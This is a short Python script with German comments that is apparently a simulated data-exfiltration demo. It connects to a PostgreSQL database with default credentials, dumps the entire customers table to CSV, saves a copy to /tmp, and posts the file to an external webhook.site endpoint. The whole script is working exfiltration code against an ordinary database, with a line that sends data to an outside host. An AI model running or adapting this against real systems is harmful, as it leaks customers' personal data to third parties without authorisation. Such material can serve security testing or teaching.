import psycopg2
import requests
import io

# Verbindung zur DB
conn = psycopg2.connect(
    dbname="postgres",
    user="postgres",
    password="postgres",
    host="db"
)
cur = conn.cursor()

# Export per COPY Befehl in ein In-Memory-Buffer
buffer = io.StringIO()
cur.copy_expert("COPY customers TO STDOUT WITH CSV HEADER", buffer)
csv_data = buffer.getvalue()

# Speichern (optional, falls mounted)
with open("/tmp/export.csv", "w") as f:
    f.write(csv_data)

# Simulierte Exfiltration via POST
requests.post("http://webhook.site/your-endpoint", files={"file": ("export.csv", csv_data)})

# Aufräumen
cur.close()
conn.close()
